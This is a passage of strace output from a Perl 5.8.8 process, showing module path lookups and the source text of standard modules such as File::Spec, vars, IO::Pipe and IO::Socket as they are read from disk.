11808 20:20:27.052278 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.052291 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.052312 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
11808 20:20:27.052497 stat64("/etc/perl/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052513 stat64("/etc/perl/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052528 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052542 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052558 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052572 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052588 stat64("/usr/lib/perl5/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052602 stat64("/usr/lib/perl5/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052616 stat64("/usr/share/perl5/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052630 stat64("/usr/share/perl5/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052644 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052658 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052674 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052688 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
11808 20:20:27.052711 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
11808 20:20:27.052727 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4de68) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.052739 _llseek(10, 0, [0], SEEK_CUR) = 0
11808 20:20:27.052757 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
11808 20:20:27.052969 stat64("/etc/perl/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052986 stat64("/etc/perl/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053002 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053017 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053033 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053048 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053064 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053078 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053093 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053107 stat64("/usr/share/perl5/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053123 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053138 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfd4dbac) = -1 ENOENT (No such file or directory)
11808 20:20:27.053154 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfd4dc9c) = -1 ENOENT (No such file or directory)
11808 20:20:27.053169 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
11808 20:20:27.053193 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
11808 20:20:27.053210 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4d9b8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.053222 _llseek(11, 0, [0], SEEK_CUR) = 0
11808 20:20:27.053243 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
11808 20:20:27.053468 read(11, "", 4096) = 0
11808 20:20:27.053485 close(11)         = 0
11808 20:20:27.053722 _llseek(10, 1148,  <unfinished ...>
11806 20:20:27.053744 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:27.053771 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11806 20:20:27.053789 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:27.053802 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11806 20:20:27.053816 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
11806 20:20:27.053833 waitpid(-1,  <unfinished ...>
11808 20:20:27.053872 <... _llseek resumed> [1148], SEEK_SET) = 0
11808 20:20:27.079572 _llseek(10, 0, [1148], SEEK_CUR) = 0
11808 20:20:27.079701 close(10)         = 0
11808 20:20:27.079859 _llseek(8, 594, [594], SEEK_SET) = 0
11808 20:20:27.079896 _llseek(8, 0, [594], SEEK_CUR) = 0
11808 20:20:27.079919 close(8)          = 0
11808 20:20:27.079977 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.079996 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080010 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080024 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080039 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080052 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080067 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080080 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080094 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080107 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080121 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080151 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.080192 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.080220 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
11808 20:20:27.080243 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.080261 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.080273 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.080294 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
11808 20:20:27.080996 brk(0x8218000)    = 0x8218000
11808 20:20:27.081149 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
11808 20:20:27.081570 read(8, "", 4096) = 0
11808 20:20:27.081586 close(8)          = 0
11808 20:20:27.081835 read(6, "", 4096) = 0
11808 20:20:27.081851 close(6)          = 0
11808 20:20:27.082028 stat64("/etc/perl/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082045 stat64("/etc/perl/IO/Pipe.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082060 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082073 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082087 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082100 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082114 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082126 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082129 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082130 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082130 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082130 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
11808 20:20:27.082130 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.082130 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.082131 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.082131 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
11808 20:20:27.082866 _llseek(6, 3425, [3425], SEEK_SET) = 0
11808 20:20:27.082890 _llseek(6, 0, [3425], SEEK_CUR) = 0
11808 20:20:27.082905 close(6)          = 0
11808 20:20:27.082936 stat64("/etc/perl/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082955 stat64("/etc/perl/IO/Socket.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.082974 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.082992 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083012 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.083031 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083052 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.083070 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083088 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.083106 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083124 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.083146 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
11808 20:20:27.083169 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.083198 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.083232 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.083265 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    